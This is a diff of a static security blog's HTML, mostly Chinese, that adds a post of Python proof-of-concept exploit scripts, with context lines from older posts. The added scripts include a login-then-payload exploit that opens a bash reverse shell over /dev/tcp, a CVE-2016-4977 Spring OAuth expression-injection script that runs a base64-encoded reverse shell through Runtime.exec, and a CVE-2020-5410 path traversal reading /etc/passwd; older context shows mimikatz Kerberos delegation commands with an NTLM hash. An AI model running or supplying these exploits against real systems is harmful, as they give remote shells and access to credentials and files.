&gt;&amp; /dev/tcp/‘+reverse_ip+’/‘+reverse_port+’ 0&gt;&amp;1”)).start()’:’yicunyiye’<br>        }</p>
+<pre><code>    res = session.get(confirm_url)
+    time.sleep(2)
+    payload_send = session.post(confirm_url,data=confirm_data,allow_redirects=False)
+    if(payload_send.status_code == 500):
+        print(&quot;[+]反弹shell成功!&quot;)
+        print(&quot;-&quot; * 50)
+    else:
+        print(&quot;[-]反弹shell失败!&quot;)
+        print(&quot;-&quot; * 50)
+else:
+    print(&quot;-&quot; * 50)
+    print(&quot;[-]login failed!&quot;)
+    print(&quot;-&quot; * 50)
+</code></pre>
+<p>except:<br>    print(“bye~~”)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 0x04 CVE-2016-4977</span><br><span class="line"></span><br><span class="line">###### 4.1 CVE-2016-4977 poc编写</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>import requests<br>import pyfiglet<br>import base64<br>import time</p>
+<p>ascii_banner = pyfiglet.figlet_format(“CVE-2016-4977”)<br>print(ascii_banner)<br>print(“blog:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yicunyiye/&quot;">https://www.cnblogs.com/yicunyiye/&quot;</a>)<br>print(“-“ * 50)<br>url = input(“attack url:”)<br>username = input(“username:”)<br>password = input(“password:”)<br>print(“-“ * 50)<br>data = username+”:”+password<br>res = base64.b64encode(data.encode(“utf-8”)).decode(“utf-8”)</p>
+<p>Authorization = “Basic “ + res</p>
+<p>headers = {<br>    “Authorization”: Authorization<br>    }<br>payload = “oauth/authorize?response_type=${11*11}&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=<a target="_blank" rel="noopener" href="http://test&quot;/">http://test&quot;</a><br>target = url+payload<br>res = requests.get(target,headers=headers)<br>result = res.text<br>if(‘121’ in result):<br>    print(“[+]%s is vulnerable” % url)<br>    print(“-“ * 50)<br>    reverse_ip = input(‘reverse ip：’)<br>    reverse_port = input(‘reverse port：’)<br>    bash_cmd = “bash -i &gt;&amp; /dev/tcp/“ + reverse_ip + “/“ + reverse_port + “ 0&gt;&amp;1”<br>    base64_cmd = base64.b64encode(bytes(bash_cmd, encoding=’utf-8’))<br>    string_bash = str(base64_cmd, ‘utf-8’)<br>    reverse_cmd = “bash -c {echo,” + string_bash + “}|{base64,-d}|{bash,-i}”</p>
+<pre><code>poc = &#39;$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&#39; % ord(reverse_cmd[0])
+
+for ch in reverse_cmd[1:]:
+    poc += &#39;.concat(T(java.lang.Character).toString(%s))&#39; % ord(ch)
+
+poc += &#39;)&#125;&#39;
+
+payload_getshell = &quot;oauth/authorize?response_type=&quot;+poc+&quot;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test&quot;
+# print(payload_getshell)
+target_getshell = url + payload_getshell
+shell = requests.get(target_getshell,headers=headers)
+time.sleep(10)
+print(&quot;getshell success!&quot;)
+</code></pre>
+<p>else:<br>    print(“[-]%s is not vulnerable” % url)<br>    print(“-“ * 50)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 0x05 CVE-2020-5410</span><br><span class="line"></span><br><span class="line">###### 5.1 CVE-2020-5410 poc编写</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>import requests<br>import pyfiglet</p>
+<p>ascii_banner = pyfiglet.figlet_format(“CVE-2020-5410”)<br>print(ascii_banner)<br>print(“blog:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yicunyiye/&quot;">https://www.cnblogs.com/yicunyiye/&quot;</a>)<br>print(“-“ * 50)</p>
+<p>url = input(“attack url:”)<br>payload = “/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23/ddd”<br>result = requests.get(url+payload)<br>if (‘root’ in result.text):<br>    print(“[+]%s is vulnerable” % url)<br>else:<br>    print(“[-]%s is not vulnerable” % url)</p>
+<pre><code>
+</code></pre>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/03/kerberos%E5%A7%94%E6%B4%BE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1004,7 +1253,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:PC-JACK-0DAY /domain:0day.org /NTLM:768623e06fae601be0c04759c87d93d3 /ticket:test.kirbi</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.bmp.ovh/imgs/2021/10/4377d7c2fc545597.png"></p>
-<p>得到<a href="mailto:&#x54;&#71;&#84;&#x5f;&#80;&#67;&#45;&#x4a;&#x41;&#x43;&#75;&#x2d;&#48;&#x44;&#x41;&#x59;&#x40;&#48;&#x44;&#x41;&#x59;&#46;&#x4f;&#x52;&#71;&#95;&#x6b;&#x72;&#x62;&#x74;&#x67;&#x74;">&#x54;&#71;&#84;&#x5f;&#80;&#67;&#45;&#x4a;&#x41;&#x43;&#75;&#x2d;&#48;&#x44;&#x41;&#x59;&#x40;&#48;&#x44;&#x41;&#x59;&#46;&#x4f;&#x52;&#71;&#95;&#x6b;&#x72;&#x62;&#x74;&#x67;&#x74;</a>~<a href="mailto:&#48;&#x64;&#x61;&#121;&#46;&#111;&#114;&#103;&#64;&#48;&#68;&#65;&#x59;&#46;&#79;&#x52;&#x47;&#46;&#107;&#x69;&#x72;&#x62;&#x69;">&#48;&#x64;&#x61;&#121;&#46;&#111;&#114;&#103;&#64;&#48;&#68;&#65;&#x59;&#46;&#79;&#x52;&#x47;&#46;&#107;&#x69;&#x72;&#x62;&#x69;</a></p>
+<p>得到<a href="mailto:&#x54;&#x47;&#84;&#x5f;&#80;&#67;&#45;&#x4a;&#65;&#x43;&#75;&#45;&#48;&#x44;&#65;&#89;&#64;&#x30;&#68;&#x41;&#x59;&#46;&#x4f;&#82;&#x47;&#x5f;&#107;&#x72;&#x62;&#x74;&#x67;&#x74;">&#x54;&#x47;&#84;&#x5f;&#80;&#67;&#45;&#x4a;&#65;&#x43;&#75;&#45;&#48;&#x44;&#65;&#89;&#64;&#x30;&#68;&#x41;&#x59;&#46;&#x4f;&#82;&#x47;&#x5f;&#107;&#x72;&#x62;&#x74;&#x67;&#x74;</a>~<a href="mailto:&#x30;&#100;&#97;&#x79;&#x2e;&#111;&#114;&#103;&#x40;&#48;&#x44;&#x41;&#89;&#x2e;&#79;&#x52;&#71;&#x2e;&#x6b;&#x69;&#114;&#x62;&#x69;">&#x30;&#100;&#97;&#x79;&#x2e;&#111;&#114;&#103;&#x40;&#48;&#x44;&#x41;&#89;&#x2e;&#79;&#x52;&#71;&#x2e;&#x6b;&#x69;&#114;&#x62;&#x69;</a></p>
 <h3 id="3-获取ST"><a href="#3-获取ST" class="headerlink" title="3.获取ST"></a>3.获取ST</h3><p>然后我们可以使用这张TGT通过伪造s4u请求以<code>administrator</code>用户身份请求访问<code>OWA2010SP3 CIFS</code>的ST</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_PC-JACK-0DAY@0DAY.ORG_krbtgt~0day.org@0DAY.ORG.kirbi /user:Administrator@0day.org /service:cifs/OWA2010SP3.0day.org</span><br></pre></td></tr></table></figure>
 
@@ -1106,7 +1355,7 @@
 
 
 <p><img src="https://i.bmp.ovh/imgs/2021/10/b7b9d716c74d6bda.png"></p>
-<p>可以看到生成了<a href="mailto:&#84;&#71;&#84;&#95;&#106;&#x61;&#99;&#107;&#x40;&#x30;&#100;&#97;&#121;&#x2e;&#x6f;&#114;&#x67;&#x2e;&#99;&#x63;&#x61;&#99;&#104;&#101;">&#84;&#71;&#84;&#95;&#106;&#x61;&#99;&#107;&#x40;&#x30;&#100;&#97;&#121;&#x2e;&#x6f;&#114;&#x67;&#x2e;&#99;&#x63;&#x61;&#99;&#104;&#101;</a></p>
+<p>可以看到生成了<a href="mailto:&#84;&#x47;&#84;&#95;&#x6a;&#x61;&#99;&#107;&#x40;&#x30;&#100;&#97;&#x79;&#x2e;&#x6f;&#114;&#103;&#x2e;&#99;&#x63;&#97;&#99;&#104;&#x65;">&#84;&#x47;&#84;&#95;&#x6a;&#x61;&#99;&#107;&#x40;&#x30;&#100;&#97;&#x79;&#x2e;&#x6f;&#114;&#103;&#x2e;&#99;&#x63;&#97;&#99;&#104;&#x65;</a></p>
 <p><strong>2.mimikatz导入票据</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc 票据路径</span><br></pre></td></tr></table></figure>
 
@@ -1262,7 +1511,7 @@
 
 <p>域内很好理解，这里来说下域外。<br>SET_LDAP_USER_PASS()这个方法用来获取url，username，password，然后调用了GetArgsValue类里面的属性。<br>​</p>
 <p>这里我用了NDesk.Options来处理获取的参数。<br>​</p>
-<p>先定义三个list<string></p>
+<p>先定义三个list<string></string></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;string&gt; domains = new List&lt;string&gt;();</span><br><span class="line">List&lt;string&gt; users = new List&lt;string&gt;();</span><br><span class="line">List&lt;string&gt; passes = new List&lt;string&gt;();</span><br></pre></td></tr></table></figure>
 
 
@@ -1344,7 +1593,7 @@
 <p>这里查询域管，我是这样进行处理的，我们先通过ldapsearch来查看返回结果<br>​</p>
 <p><img src="https://cdn.jsdelivr.net/gh/filess/img5@main/2021/10/01/1633088452249-ac636722-4320-4a0d-bef1-3ea3d85ab70d.png"></p>
 <p>然后我获取member的数量然后看里面是否包含user来输出。</p>
-<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="0x04-AdminSDHolder检测与后门用户添加"><a href="#0x04-AdminSDHolder检测与后门用户添加" class="headerlink" title="0x04 AdminSDHolder检测与后门用户添加"></a>0x04 AdminSDHolder检测与后门用户添加</h1><h2 id="4-1-检测"><a href="#4-1-检测" class="headerlink" title="4.1 检测"></a>4.1 检测</h2><p>AdminSDHolder是对CN=AdminSDHolder,CN=System,DC=redteam,DC=local这个cn拥有完全控制权限的用户，我们前面说到<br>​</p>
+<h2 id><a href="#" class="headerlink" title></a></h2><h1 id="0x04-AdminSDHolder检测与后门用户添加"><a href="#0x04-AdminSDHolder检测与后门用户添加" class="headerlink" title="0x04 AdminSDHolder检测与后门用户添加"></a>0x04 AdminSDHolder检测与后门用户添加</h1><h2 id="4-1-检测"><a href="#4-1-检测" class="headerlink" title="4.1 检测"></a>4.1 检测</h2><p>AdminSDHolder是对CN=AdminSDHolder,CN=System,DC=redteam,DC=local这个cn拥有完全控制权限的用户，我们前面说到<br>​</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public DirectorySearcher (System.DirectoryServices.DirectoryEntry searchRoot);</span><br></pre></td></tr></table></figure>
 
 <p>这里的searchroot就是查询的根地址我们就需要绑定到CN=AdminSDHolder,CN=System,DC=redteam,DC=local这里来也就是说url为</p>
@@ -1532,7 +1781,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
